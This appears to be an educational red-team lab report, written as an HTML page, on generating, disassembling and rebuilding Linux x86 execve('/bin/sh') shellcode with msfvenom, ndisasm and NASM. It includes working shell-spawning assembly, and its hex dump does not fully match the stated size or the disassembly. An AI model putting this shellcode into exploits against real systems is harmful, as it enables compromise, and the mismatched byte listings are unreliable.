<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Lab 1 ‚Äì x86 Shellcode Reconstruction</title>
  <link rel="stylesheet" href="assets/css/style.css" />
</head>
<body>
  <div class="container">
    <h1 id="lab-1">üß™ Red Team Lab Report: Reconstructing x86 Linux Shellcode (<code>execve("/bin/sh")</code>)</h1>
    <p><strong>Author:</strong> Alexander Nichols<br>
       <strong>Date:</strong> July 5th, 2025<br>
       <strong>Platform:</strong> Kali Linux<br>
       <strong>Category:</strong> Red Team Development / Reverse Engineering / Assembly<br>
       <strong>Objective:</strong> Disassemble, understand, and reconstruct <code>execve("/bin/sh")</code> shellcode from raw bytes.</p>
    <hr>

    <h2 id="overview">üõéÔ∏è Overview</h2>
    <p>This lab documents the full hands-on journey of analyzing a shell-spawning Linux payload generated by <code>msfvenom</code>, reverse engineering it byte-by-byte, and ultimately reconstructing a clean version from scratch in NASM.</p>
    <p>The payload invokes:</p>
    <pre><code class="language-bash">execve("/bin/sh", NULL, NULL);</code></pre>
    <p>A minimal and powerful syscall used in countless Red Team payloads and post-exploitation tooling.</p>
    <p>Along the way, I ran into segmentation faults, operand mismatch errors, and garbage instruction interpretation ‚Äî all of which forced me to go beyond copy-paste tactics and build a cleaner, minimal shellcode version using syscall knowledge.</p>
    <hr>

    <h2 id="goals">üß† Goals</h2>
    <ul>
      <li>Generate and inspect raw Linux x86 shellcode with <code>msfvenom</code></li>
      <li>Disassemble with <code>ndisasm</code> and analyze opcode logic</li>
      <li>Rebuild clean shellcode from scratch in NASM</li>
      <li>Debug segmentation faults and operand errors</li>
      <li>Compare real-world shellcode vs clean lab variant</li>
    </ul>
    <hr>

    <h2 id="environment">üõ†Ô∏è Lab Environment</h2>
    <table>
      <thead><tr><th>Component</th><th>Details</th></tr></thead>
      <tbody>
        <tr><td>OS</td><td>Kali Linux 2024.2 (64-bit)</td></tr>
        <tr><td>Architecture</td><td>32-bit (x86, via <code>ld -m elf_i386</code>)</td></tr>
        <tr><td>Tools Used</td><td><code>msfvenom</code>, <code>nasm</code>, <code>ndisasm</code>, <code>ld</code>, <code>gdb</code>, <code>xxd</code>, <code>nano</code></td></tr>
        <tr><td>Directory</td><td><code>~/red_team_labs/1_x86_shellcode_reconstructing_malware</code></td></tr>
        <tr><td>Payload</td><td><code>linux/x86/exec CMD="/bin/sh"</code></td></tr>
      </tbody>
    </table>
    <hr>

    <h2 id="step-1">üì¶ Step 1: Generate Shellcode with <code>msfvenom</code></h2>
    <pre><code class="language-bash">mkdir -p ~/red_team_labs/1_x86_shellcode_reconstructing_malware
cd ~/red_team_labs/1_x86_shellcode_reconstructing_malware
msfvenom -p linux/x86/exec CMD="/bin/sh" -f raw -o shellcode.raw
</code></pre>

    <p>Output:</p>
    <pre><code class="language-bash">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Payload size: 43 bytes
Saved as: shellcode.raw
</code></pre>

    <p>Inspect raw bytes:</p>
    <pre><code class="language-bash">xxd shellcode.raw
</code></pre>

    <p>Output:</p>
    <pre><code class="language-hex">00000000: 6a0b5899 5266 682d6389e7 682f7368 00682f62
00000010: 696e89e3 52e80800 00002f62 696e2f73 68005753
00000020: 89e1cd80
</code></pre>
    <hr>

    <h2 id="step-2">üîç Step 2: Disassemble with <code>ndisasm</code></h2>
    <pre><code class="language-bash">ndisasm -b 32 shellcode.raw
</code></pre>
    <pre><code class="language-nasm">00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi, esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx, esp
00000017  52                push edx
00000018  E808000000        call 0x25
0000001D  2F                das
0000001E  62696E            bound ebp, [ecx+0x6e]
00000021  2F                das
00000022  7368              jnc 0x8c
00000024  005753            add [edi+0x53], dl
00000027  89E1              mov ecx, esp
00000029  CD80              int 0x80
</code></pre>
    <hr>

    <h2 id="debug">üîß Reverse Engineering & Debugging</h2>
    <h3>üö´ Initial Assembly Attempt</h3>
    <pre><code class="language-nasm">BITS 32
global _start
section .text
_start:
    push byte +0xb
    pop eax
    cdq
    push edx
    push word 0x632d
    mov edi, esp
    push dword 0x68732f
    push dword 0x6e69622f
    mov ebx, esp
    push edx
    call short get_string
get_string:
    pop ecx
    mov ecx, esp
    int 0x80
</code></pre>

    <h3>‚ùå Errors Encountered</h3>
    <ul>
      <li><code>nasm</code> refused to compile until I used <code>push dword</code></li>
      <li>Execution segfaulted due to malformed argv/envp</li>
      <li><code>call</code>/<code>pop</code> trick inserted garbage opcodes like <code>das</code>, <code>bound</code></li>
    </ul>
    <hr>

    <h2 id="pivot">‚ôªÔ∏è The Pivot</h2>
    <p>I rewrote the shellcode cleanly based on how <code>execve()</code> works:</p>
    <pre><code class="language-c">int execve(const char *pathname, char *const argv[], char *const envp[]);
</code></pre>

    <table>
      <thead><tr><th>Register</th><th>Purpose</th><th>Value</th></tr></thead>
      <tbody>
        <tr><td><code>ebx</code></td><td>filename ptr</td><td><code>"/bin//sh"</code></td></tr>
        <tr><td><code>ecx</code></td><td>argv ptr</td><td>NULL</td></tr>
        <tr><td><code>edx</code></td><td>envp ptr</td><td>NULL</td></tr>
      </tbody>
    </table>
    <hr>

    <h2 id="final">‚úÖ Final Working shell.asm</h2>
    <pre><code class="language-nasm">; shell.asm - execve("/bin//sh", NULL, NULL)

BITS 32
global _start
section .text
_start:
    mov eax, 0xb          ; syscall: execve
    cdq                   ; edx = 0 (envp = NULL)
    push edx
    push dword 0x68732f2f ; //sh
    push dword 0x6e69622f ; /bin
    mov ebx, esp          ; ebx ‚Üí "/bin//sh"
    push edx              ; argv[1] = NULL
    xor ecx, ecx          ; ecx = NULL
    int 0x80              ; syscall
</code></pre>
    <hr>

    <h2 id="build">üîß Build and Run</h2>
    <pre><code class="language-bash">nasm -f elf32 shell.asm -o shell.o
ld -m elf_i386 shell.o -o shell
./shell
</code></pre>
    <p>‚úÖ <strong>Result:</strong> Dropped into a working <code>/bin/sh</code> shell!</p>
    <hr>

    <h2 id="comparison">üîÑ Real-World vs Clean Shellcode</h2>
    <table>
      <thead><tr><th>Feature</th><th>msfvenom</th><th>Clean</th></tr></thead>
      <tbody>
        <tr><td>Obfuscation</td><td>Yes (call + inline)</td><td>No</td></tr>
        <tr><td>Operand tricks</td><td>push byte/word</td><td>push dword only</td></tr>
        <tr><td>Segfault-prone</td><td>Yes</td><td>No</td></tr>
        <tr><td>Assembly-friendly</td><td>‚ùå</td><td>‚úÖ</td></tr>
        <tr><td>Educational clarity</td><td>‚ùå</td><td>‚úÖ</td></tr>
      </tbody>
    </table>
    <hr>

    <h2 id="value">üîê Red Teaming Value</h2>
    <ul>
      <li>Linux syscall register mapping</li>
      <li>x86 assembly syntax and calling conventions</li>
      <li>Disassembly and reverse engineering</li>
      <li>Avoiding and debugging segmentation faults</li>
      <li>Why msfvenom uses position-independent code</li>
      <li>How to strip obfuscation for clarity and reuse</li>
    </ul>
    <hr>

    <h2 id="extensions">üîÆ Optional Extensions</h2>
    <ul>
      <li>XOR encode + decoder stub in NASM</li>
      <li>Wrapper C program with inline shellcode</li>
      <li>Write a connect-back reverse shell manually</li>
      <li>Avoid <code>int 0x80</code> with <code>sysenter</code> or dynamic syscall lookup</li>
    </ul>
    <hr>

    <h2 id="skills">‚úÖ Skills Demonstrated</h2>
    <ul>
      <li>‚úÖ Linux syscall internals</li>
      <li>‚úÖ Shellcode reconstruction</li>
      <li>‚úÖ Disassembly and debugging</li>
      <li>‚úÖ Assembly authoring and linking</li>
      <li>‚úÖ Reverse engineering mindset</li>
    </ul>
    <hr>

    <h2 id="next">üöÄ Next Labs</h2>
    <ul>
      <li>x86 reverse TCP connect-back shell</li>
      <li>XOR polymorphic decoder</li>
      <li>Shellcode injection via stack overflow</li>
      <li>Runtime shellcode loader in C</li>
    </ul>
    <hr>

    <p><em>All work performed in a self-contained Kali Linux lab. Questions or feedback? <a href="https://www.linkedin.com/in/alnich1/" target="_blank">Let's connect</a>.</em></p>
    <p><a href="labs.html">‚¨Ö Back to Labs</a></p>
  </div>

  <button id="mode-toggle">üåô</button>
  <script src="assets/js/darkmode.js"></script>
</body>
</html>